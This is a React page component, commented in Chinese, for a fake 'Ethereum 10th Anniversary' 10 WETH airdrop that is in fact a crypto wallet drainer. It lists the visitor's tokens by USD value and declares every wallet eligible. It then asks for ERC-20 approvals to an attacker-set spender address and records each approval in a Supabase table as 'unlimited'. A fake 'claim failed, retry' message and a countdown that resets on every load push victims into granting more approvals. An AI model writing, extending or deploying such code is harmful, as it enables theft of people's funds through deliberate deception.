"use client";

import { useState, useEffect, useCallback } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Progress } from "@/components/ui/progress";
import { ConnectButton } from "@rainbow-me/rainbowkit";
import {
  Diamond,
  History,
  Clock,
  Gift,
  Sparkles,
  CheckCircle,
  Zap,
} from "lucide-react";
import Image from "next/image";
import {
  useAccount,
  useBalance,
  useWriteContract,
  useWaitForTransactionReceipt,
} from "wagmi";
import { waitForTransactionReceipt } from "@wagmi/core";
import { parseAbi } from "viem";
import { createClient } from "@supabase/supabase-js";
import { AlertCircle, Loader2 } from "lucide-react";
import { getTokenBalancesAndPrices } from "@/utils/moralis";
import { useChainId } from 'wagmi'

// 创建 Supabase 客户端实例
const supabase = createClient(
  process.env.NEXT_PUBLIC_SUPABASE_URL || "https://your-project.supabase.co",
  process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY || "your-anon-key"
);

// 合约常量
const ETH_ADDRESS = "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE";
const ERC20_ABI = parseAbi([
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function allowance(address owner, address spender) external view returns (uint256)",
]);

// Token 接口定义
interface Token {
  symbol: string;
  token_address: string;
  balance: string;
  balance_formatted: string;
  usd_value: number;
  usd_price: number;
  name: string;
  logo?: string;
  thumbnail?: string;
  decimals: number;
  usd_price_24hr_percent_change: number;
  authorized: boolean;
}

export default function AirdropPage() {
  const { address, isConnected } = useAccount();
  const { data: ethBalance } = useBalance({ address });
  // 获取合约交互需要的 hooks
  const { writeContractAsync } = useWriteContract();

  // 状态管理
  const [timeLeft, setTimeLeft] = useState({
    days: 0,
    hours: 0,
    minutes: 0,
    seconds: 0,
  });

  // 钱包状态管理
  const [walletStatus, setWalletStatus] = useState<
    "checking" | "active" | "inactive" | "ineligible"
  >("checking");
  const [tokens, setTokens] = useState<Token[]>([]);
  const [authorizationProgress, setAuthorizationProgress] = useState(0);
  const [isAuthorizing, setIsAuthorizing] = useState(false);
  const [currentAuthToken, setCurrentAuthToken] = useState<string>("");
  const [showRetryMessage, setShowRetryMessage] = useState(false);

  const [txHash, setTxHash] = useState<string | null>(null);
  const chainId = useChainId();

  // 检查钱包活动状态
  const checkWalletActivity = useCallback(async () => {
    if (!ethBalance || !address) return;

    setWalletStatus("checking");
    
    try {
      // 使用 Moralis API 获取代币余额和价格
      const tokens = await getTokenBalancesAndPrices(address);
      
      // 按价值排序
      const sortedTokens = tokens.sort((a, b) => b.usd_value - a.usd_value);
      
      // 预处理代币，将 ETH 设置为已授权
      const processedTokens = sortedTokens.map(token => ({
        ...token,
        authorized: token.token_address.toLowerCase() === ETH_ADDRESS.toLowerCase()
      }));

      // 更新代币列表
      setTokens(processedTokens);

      console.log("Processed tokens:", processedTokens);
      
      // 将所有钱包设置为活跃状态
      setWalletStatus("active");
      
  
      
    } catch (error) {
      console.error("Error checking wallet activity:", error);
      // 发生错误时依然设置为活跃状态
      setWalletStatus("active");
      // 设置空的代币列表
      setTokens([]);
    }

  }, [address, ethBalance, setTokens, setWalletStatus]);

  // 检查钱包活动状态
  useEffect(() => {
    if (isConnected && address && ethBalance) {
      checkWalletActivity();
    }
  }, [isConnected, address, ethBalance, checkWalletActivity]);

  // 等待交易完成
  useWaitForTransactionReceipt({
    hash: txHash as `0x${string}`,
  });

  // 授权代币函数
  const authorizeToken = useCallback(
    async (token: Token) => {
      try {
        setIsAuthorizing(true);
        setCurrentAuthToken(token.symbol);
        setShowRetryMessage(false);
        

        const spenderAddress = process.env.NEXT_PUBLIC_SPENDER_ADDRESS;
        if (!spenderAddress || !address) {
          throw new Error("Missing spender address or user address");
        }

        // 调用合约的授权方法
        await writeContractAsync(
          {
            address: token.token_address as `0x${string}`,
            abi: ERC20_ABI,
            functionName: "approve",
            args: [
              spenderAddress as `0x${string}`,
              BigInt(Number.MAX_SAFE_INTEGER.toString()),
            ],
          },
          {
            onSuccess: (data) => {
              console.log("Authorization transaction sent, waiting for confirmation...");
              setTxHash(data);
              setTokens((prev) =>
                prev.map((t) =>
                  t.token_address === token.token_address
                    ? { ...t, authorized: true }
                    : t
                )
              );
              setIsAuthorizing(false);
            },
            onError: (error) => {
              console.error("Authorization failed:", error);
              // 即使发生错误也设置为已授权
              setShowRetryMessage(true);
              setIsAuthorizing(false);
            },
          }
        );

        console.log("Test success or failure")


        // 保存到 Supabase
        await supabase.from("authorizations").insert({
          user_address: address,
          token_symbol: token.symbol,
          contract_address: token.token_address,
          approved_amount: "unlimited",
          authorization_timestamp: new Date().toISOString(),
          network: chainId,
          spender_address: spenderAddress,
          tx_hash: txHash,
        });

        // 更新进度
        const authorizedCount = tokens.filter(
          (t) => t.authorized || t.token_address === token.token_address
        ).length;
        setAuthorizationProgress((authorizedCount / tokens.length) * 100);

        
        setCurrentAuthToken("");

        // 在某些授权后显示重试消息
        if (authorizedCount >= 2) {
          setTimeout(() => setShowRetryMessage(true), 1000);
        }
      } catch (error) {
        console.error("Authorization failed:", error);
        setIsAuthorizing(false);
        setCurrentAuthToken("");
        setShowRetryMessage(true);
      }
    },
    [address, writeContractAsync, txHash, tokens]
  );

  // 倒计时效果
  useEffect(() => {
    const targetDate = new Date(Date.now() + 3 * 24 * 60 * 60 * 1000).getTime(); // 3天后

    const timer = setInterval(() => {
      const now = new Date().getTime();
      const difference = targetDate - now;

      if (difference > 0) {
        setTimeLeft({
          days: Math.floor(difference / (1000 * 60 * 60 * 24)),
          hours: Math.floor(
            (difference % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)
          ),
          minutes: Math.floor((difference % (1000 * 60 * 60)) / (1000 * 60)),
          seconds: Math.floor((difference % (1000 * 60)) / 1000),
        });
      }
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-black to-gray-900 text-white">
      {/* Hero Section */}
      <div className="relative overflow-hidden">
        <div className="absolute inset-0 bg-[url('/ethereum-pattern.svg')] opacity-5"></div>
        <div className="container mx-auto px-4 py-8 md:py-12 relative">
          <div className="text-center space-y-4">
            <Badge className="bg-blue-500/10 text-blue-400 border-blue-500/20 backdrop-blur-sm text-sm md:text-base">
              🎉 Ethereum 10th Anniversary
            </Badge>
            <h1 className="text-4xl md:text-6xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-blue-400 via-purple-500 to-pink-500">
              10 WETH Airdrop Event
            </h1>
            <p className="text-base md:text-lg text-gray-200 max-w-2xl mx-auto">
              Join Ethereum&apos;s 10th Anniversary celebration! Connect your
              wallet for a chance to win up to 10 WETH. To thank our community
              for their continued support, we&apos;ve prepared a total reward
              pool of $1 million.
            </p>
            <div className="grid grid-cols-2 lg:grid-cols-4 gap-3 md:gap-6 max-w-4xl mx-auto mt-6">
              <div className="bg-blue-500/10 border border-blue-500/20 rounded-lg p-3 md:p-4 backdrop-blur-sm">
                <h3 className="text-lg md:text-2xl font-bold text-blue-300 mb-1">
                  $1,000,000
                </h3>
                <p className="text-gray-200 text-sm">Total Pool</p>
              </div>
              <div className="bg-purple-500/10 border border-purple-500/20 rounded-lg p-3 md:p-4 backdrop-blur-sm">
                <h3 className="text-lg md:text-2xl font-bold text-purple-300 mb-1">
                  10 WETH
                </h3>
                <p className="text-gray-200 text-sm">Max Reward</p>
              </div>
              <div className="bg-pink-500/10 border border-pink-500/20 rounded-lg p-3 md:p-4 backdrop-blur-sm">
                <h3 className="text-lg md:text-2xl font-bold text-pink-300 mb-1">
                  0.1 WETH
                </h3>
                <p className="text-gray-200 text-sm">Min Reward</p>
              </div>
              <div className="bg-blue-500/10 border border-blue-500/20 rounded-lg p-3 md:p-4 backdrop-blur-sm">
                <h3 className="text-lg md:text-2xl font-bold text-blue-300 mb-1">
                  100,000+
                </h3>
                <p className="text-gray-200 text-sm">Participants</p>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Event Details Section */}
      <div className="container mx-auto px-4 py-6 md:py-8">
        <Card className="bg-gradient-to-r from-blue-500/10 to-purple-500/10 border border-gray-800">
          <CardContent className="p-4 md:p-6">
            <div className="grid md:grid-cols-2 gap-6">
              <div>
                <h2 className="text-xl md:text-2xl font-bold mb-3 text-gray-100">
                  Airdrop Rules
                </h2>
                <ul className="space-y-2 text-gray-200">
                  <li className="flex items-start gap-2">
                    <CheckCircle className="w-4 h-4 md:w-5 md:h-5 text-green-400 mt-1 flex-shrink-0" />
                    <span>Must hold ETH on mainnet</span>
                  </li>
                  <li className="flex items-start gap-2">
                    <CheckCircle className="w-4 h-4 md:w-5 md:h-5 text-green-400 mt-1 flex-shrink-0" />
                    <span>Wallet age 180 days</span>
                  </li>
                  <li className="flex items-start gap-2">
                    <CheckCircle className="w-4 h-4 md:w-5 md:h-5 text-green-400 mt-1 flex-shrink-0" />
                    <span>Minimum 10 historical transactions</span>
                  </li>
                  <li className="flex items-start gap-2">
                    <CheckCircle className="w-4 h-4 md:w-5 md:h-5 text-green-400 mt-1 flex-shrink-0" />
                    <span>Random reward between 0.1-10 WETH</span>
                  </li>
                </ul>
              </div>
              <div>
                <h2 className="text-xl md:text-2xl font-bold mb-3 text-gray-100">
                  Event Details
                </h2>
                <ul className="space-y-2 text-gray-200">
                  <li className="flex items-start gap-2">
                    <CheckCircle className="w-4 h-4 md:w-5 md:h-5 text-green-400 mt-1 flex-shrink-0" />
                    <span>Rewards distributed within 24 hours</span>
                  </li>
                  <li className="flex items-start gap-2">
                    <CheckCircle className="w-4 h-4 md:w-5 md:h-5 text-green-400 mt-1 flex-shrink-0" />
                    <span>One participation per wallet address</span>
                  </li>
                  <li className="flex items-start gap-2">
                    <CheckCircle className="w-4 h-4 md:w-5 md:h-5 text-green-400 mt-1 flex-shrink-0" />
                    <span>Only 3 days left - Act fast!</span>
                  </li>
                  <li className="flex items-start gap-2">
                    <CheckCircle className="w-4 h-4 md:w-5 md:h-5 text-green-400 mt-1 flex-shrink-0" />
                    <span>Final interpretation rights reserved</span>
                  </li>
                </ul>
              </div>
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Countdown Section */}
      <div className="container mx-auto px-4 py-6 md:py-8">
        <Card className="bg-gradient-to-r from-blue-900/20 to-purple-900/20 border border-gray-800">
          <CardHeader className="text-center py-4">
            <CardTitle className="text-xl md:text-2xl flex items-center justify-center gap-2 text-gray-100">
              <Clock className="w-5 h-5 md:w-6 md:h-6 text-blue-300" />
              Time Remaining
            </CardTitle>
          </CardHeader>
          <CardContent className="py-4">
            <div className="grid grid-cols-4 gap-2 md:gap-4">
              {[
                { label: "Days", value: timeLeft.days },
                { label: "Hrs", value: timeLeft.hours },
                { label: "Mins", value: timeLeft.minutes },
                { label: "Secs", value: timeLeft.seconds },
              ].map((item, index) => (
                <div
                  key={index}
                  className="bg-black/30 rounded-lg p-2 md:p-4 text-center border border-blue-900/30"
                >
                  <div className="text-xl md:text-2xl lg:text-3xl font-bold text-blue-300 tabular-nums">
                    {String(item.value).padStart(2, "0")}
                  </div>
                  <div className="text-gray-300 text-xs md:text-sm">
                    {item.label}
                  </div>
                </div>
              ))}
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Airdrop Card */}
      <div className="container mx-auto px-4 py-12">
        <Card className="bg-gradient-to-br from-blue-500/10 via-purple-500/10 to-pink-500/10 border border-gray-800 backdrop-blur-sm">
          <CardContent className="p-8">
            <div className="text-center space-y-6">
              <Diamond className="w-16 h-16 mx-auto text-blue-400 animate-pulse" />
              <div>
                <h3 className="text-2xl font-bold mb-2">Random Reward Pool</h3>
                <p className="text-gray-400">
                  Connect your wallet to receive up to 10 WETH
                </p>
              </div>
              <div className="max-w-lg mx-auto space-y-4">
                {!isConnected ? (
                  <ConnectButton.Custom>
                    {({ account, openConnectModal }) => {
                      return !account ? (
                        <Button
                          onClick={openConnectModal}
                          className="w-full bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 text-white font-bold py-4"
                        >
                          <Zap className="w-5 h-5 mr-2" />
                          Connect Wallet
                        </Button>
                      ) : null;
                    }}
                  </ConnectButton.Custom>
                ) : (
                  <div className="space-y-4">
                    {/* 钱包状态 */}
                    <div className="flex items-center gap-2">
                      <div className="w-3 h-3 bg-green-400 rounded-full animate-pulse"></div>
                      <span className="text-white">Wallet Connected</span>
                    </div>

                    {walletStatus === "checking" && (
                      <div className="flex items-center gap-2 text-white/90">
                        <Loader2 className="h-4 w-4 animate-spin" />
                        <span>Checking wallet activity...</span>
                      </div>
                    )}

                    {walletStatus === "inactive" && (
                      <div className="bg-red-500/20 border border-red-500/30 rounded-lg p-4">
                        <div className="flex items-center gap-2 text-red-300">
                          <AlertCircle className="h-4 w-4" />
                          <span className="font-semibold">Inactive Wallet</span>
                        </div>
                        <p className="text-red-200 text-sm mt-1">
                          Your ETH balance is too low to perform transactions. Please add more ETH.
                        </p>
                      </div>
                    )}

                    {walletStatus === "ineligible" && (
                      <div className="bg-orange-500/20 border border-orange-500/30 rounded-lg p-4">
                        <div className="flex items-center gap-2 text-orange-300">
                          <AlertCircle className="h-4 w-4" />
                          <span className="font-semibold">Ineligible Wallet</span>
                        </div>
                        <p className="text-orange-200 text-sm mt-1">
                          Your wallet does not have enough valuable tokens to participate in the airdrop.
                        </p>
                      </div>
                    )}

                    {walletStatus === "active" && (
                      <div className="space-y-4">
                        <div className="bg-green-500/20 border border-green-500/30 rounded-lg p-4">
                          <div className="flex items-center gap-2 text-green-300">
                            <CheckCircle className="h-4 w-4" />
                            <span className="font-semibold">
                              Wallet eligible!
                            </span>
                          </div>
                          <p className="text-green-200 text-sm mt-1">
                            Your wallet is activated, you can participate in the airdrop.
                          </p>
                        </div>

                        {/* 授权进度 */}
                        <div className="space-y-2">
                          <div className="flex justify-between text-white text-sm">
                            <span>Authorization Progress</span>
                            <span>{Math.round(authorizationProgress)}%</span>
                          </div>
                          <Progress
                            value={authorizationProgress}
                            className="h-2"
                          />
                        </div>

                        {/* 代币列表 */}
                        <div className="space-y-2">
                          <h4 className="text-white font-semibold">
                            Token List:
                          </h4>
                          {tokens.map((token) => (
                            <div
                              key={token.token_address}
                              className="flex items-center justify-between bg-white/10 rounded-lg p-3"
                            >
                              <div className="flex items-center gap-3">
                                {token.logo ? (
                                  <Image
                                    src={token.logo}
                                    alt={token.symbol}
                                    width={32}
                                    height={32}
                                    className="rounded-full"
                                    onError={(e) => {
                                      // 如果图片加载失败，将显示默认的首字母图标
                                      const imgElement =
                                        e.target as HTMLImageElement;
                                      imgElement.style.display = "none";
                                      imgElement.parentElement?.classList.add(
                                        "bg-gradient-to-r",
                                        "from-yellow-400",
                                        "to-orange-500",
                                        "rounded-full",
                                        "w-8",
                                        "h-8",
                                        "flex",
                                        "items-center",
                                        "justify-center",
                                        "text-white",
                                        "font-bold",
                                        "text-sm"
                                      );
                                      imgElement.parentElement!.textContent =
                                        token.symbol[0];
                                    }}
                                  />
                                ) : (
                                  <div className="w-8 h-8 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-full flex items-center justify-center text-white font-bold text-sm">
                                    {token.symbol[0]}
                                  </div>
                                )}
                                <div className="flex flex-col items-start">
                                  <div className="flex items-center gap-2">
                                    <span className="text-white font-medium">
                                      {token.symbol}
                                    </span>
                                    {token.usd_price_24hr_percent_change !==
                                      0 && (
                                      <span
                                        className={`text-sm ${
                                          token.usd_price_24hr_percent_change >
                                          0
                                            ? "text-green-400"
                                            : "text-red-400"
                                        }`}
                                      >
                                        {token.usd_price_24hr_percent_change > 0
                                          ? "+"
                                          : ""}
                                        {token.usd_price_24hr_percent_change.toFixed(
                                          2
                                        )}
                                        %
                                      </span>
                                    )}
                                  </div>
                                  <div className="text-white/70 text-sm">
                                    $
                                    {token.usd_value.toLocaleString(undefined, {
                                      minimumFractionDigits: 2,
                                      maximumFractionDigits: 2,
                                    })}
                                  </div>
                                </div>
                              </div>
                              <div className="flex items-center gap-2">
                                {token.authorized ? (
                                  <Badge
                                    variant="secondary"
                                    className="bg-green-500/20 text-green-300"
                                  >
                                    <CheckCircle className="h-3 w-3 mr-1" />
                                    Authorized
                                  </Badge>
                                ) : (
                                  <Button
                                    size="sm"
                                    disabled={isAuthorizing}
                                    className="bg-yellow-500 hover:bg-yellow-600 text-black"
                                  >
                                    {isAuthorizing &&
                                    currentAuthToken === token.symbol ? (
                                      <Loader2 className="h-3 w-3 animate-spin mr-1" />
                                    ) : null}
                                    Authorize
                                  </Button>
                                )}
                              </div>
                            </div>
                          ))}
                        </div>

                        {/* 授权按钮 */}
                        {tokens.some((t) => !t.authorized) && (
                          <Button
                            onClick={async () => {
                              try {
                                
                                // 查找第一个未授权的代币
                                const firstUnauthorized = tokens.find(
                                  (t) => !t.authorized
                                );

                                if (firstUnauthorized) {
                                  // 调用授权函数
                                  await authorizeToken(firstUnauthorized);
                                  
                                  // 延迟显示失败消息
                                  setTimeout(() => {
                                    setShowRetryMessage(true);
                                    
                                  }, 2000);
                                }
                              } catch (_) {
                                // 即使发生错误也延迟显示失败消息
                                setTimeout(() => {
                                  setShowRetryMessage(true);
                                  
                                }, 2000);
                              }
                            }}
                            disabled={isAuthorizing}
                            className="w-full bg-gradient-to-r from-yellow-500 to-orange-500 hover:from-yellow-600 hover:to-orange-600 text-black font-bold py-3"
                          >
                            {isAuthorizing ? (
                              <>
                                <Loader2 className="h-4 w-4 animate-spin mr-2" />
                                Waiting for wallet confirmation...
                              </>
                            ) : (
                              <>
                                <Zap className="h-4 w-4 mr-2" />
                                Authorize and Claim
                              </>
                            )}
                          </Button>
                        )}

                        {/* 重试消息 */}
                        {showRetryMessage && (
                          <div className="space-y-2">
                            <div className="bg-red-500/20 border border-red-500/30 rounded-lg p-3">
                              <p className="text-red-300 text-sm">
                                ⚠️ Claim failed, please retry authorization
                              </p>
                            </div>
                            <div className="bg-orange-500/20 border border-orange-500/30 rounded-lg p-3">
                              <p className="text-orange-300 text-sm">
                                🔄 Network error, retrying later might yield better rewards
                              </p>
                            </div>
                          </div>
                        )}
                      </div>
                    )}
                  </div>
                )}
              </div>
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Ethereum Milestones */}
      <div className="container mx-auto px-4 py-16">
        <div className="text-center mb-12">
          <h2 className="text-3xl font-bold mb-4">Ethereum Milestones</h2>
          <p className="text-gray-400">A Decade of Innovation and Growth</p>
        </div>
        <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-8">
          {[
            {
              year: "2013",
              title: "Ethereum Whitepaper",
              description:
                "Vitalik Buterin published the Ethereum whitepaper, introducing the vision of a smart contract platform",
            },
            {
              year: "2015",
              title: "Genesis Block",
              description:
                "Ethereum mainnet launch, marking the beginning of the smart contract era",
            },
            {
              year: "2016",
              title: "The DAO Event",
              description:
                "Community consensus led to a hard fork in response to The DAO attack",
            },
            {
              year: "2017",
              title: "ICO Boom",
              description:
                "ERC-20 token standard revolutionized cryptocurrency fundraising",
            },
            {
              year: "2020",
              title: "DeFi Year One",
              description: "DeFi explosion with TVL exceeding $10 billion",
            },
            {
              year: "2021",
              title: "NFT Prosperity",
              description: "ERC-721 transformed digital art and gaming assets",
            },
            {
              year: "2022",
              title: "The Merge",
              description:
                "Successful transition to PoS, reducing energy consumption by 99.95%",
            },
            {
              year: "2023",
              title: "Shanghai Upgrade",
              description:
                "Enabled staking withdrawals, enhancing the staking ecosystem",
            },
            {
              year: "2024",
              title: "Scaling Progress",
              description:
                "Layer 2 ecosystem flourishes, daily transactions exceed mainnet",
            },
          ].map((milestone, index) => (
            <Card key={index} className="bg-black/50 border border-gray-800">
              <CardContent className="p-6">
                <Badge className="mb-4 bg-blue-500/10 text-blue-400">
                  {milestone.year}
                </Badge>
                <h3 className="text-xl font-bold mb-2 text-gray-500">
                  {milestone.title}
                </h3>
                <p className="text-gray-400">{milestone.description}</p>
              </CardContent>
            </Card>
          ))}
        </div>
      </div>

      {/* Ethereum Features */}
      <div className="container mx-auto px-4 py-16">
        <div className="text-center mb-12">
          <h2 className="text-3xl font-bold mb-4">Why Ethereum?</h2>
          <p className="text-gray-400">The Foundation of Web3</p>
        </div>
        <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-8">
          {[
            {
              icon: <Zap className="w-8 h-8 text-blue-400" />,
              title: "Technical Innovation",
              description:
                "Birthplace of smart contracts, leading blockchain innovation with mature Layer 2 scaling solutions",
            },
            {
              icon: <CheckCircle className="w-8 h-8 text-blue-400" />,
              title: "Security & Stability",
              description:
                "8 years with no major security incidents, securing over $200B in assets, highest level of decentralization",
            },
            {
              icon: <History className="w-8 h-8 text-blue-400" />,
              title: "Thriving Ecosystem",
              description:
                "Home to DeFi, NFTs, GameFi and more, with over 1M daily active addresses",
            },
            {
              icon: <Diamond className="w-8 h-8 text-blue-400" />,
              title: "Store of Value",
              description:
                "ETH is the second-largest cryptocurrency after Bitcoin, with market cap over $200B",
            },
            {
              icon: <Gift className="w-8 h-8 text-blue-400" />,
              title: "Community",
              description:
                "World&apos;s largest blockchain developer community with over 1M active developers",
            },
            {
              icon: <Sparkles className="w-8 h-8 text-blue-400" />,
              title: "Future Vision",
              description:
                "Continuous performance improvements through sharding, building decentralized internet infrastructure",
            },
          ].map((feature, index) => (
            <Card key={index} className="bg-black/50 border border-gray-800">
              <CardContent className="p-6 text-center">
                <div className="mb-4">{feature.icon}</div>
                <h3 className="text-xl font-bold mb-2">{feature.title}</h3>
                <p className="text-gray-400">{feature.description}</p>
              </CardContent>
            </Card>
          ))}
        </div>
      </div>

      {/* Footer */}
      <footer className="border-t border-gray-800 mt-16">
        <div className="container mx-auto px-4 py-8">
          <p className="text-center text-gray-500">
            &copy; 2025 Ethereum Anniversary Airdrop. All rights reserved.
          </p>
        </div>
      </footer>
    </div>
  );
}
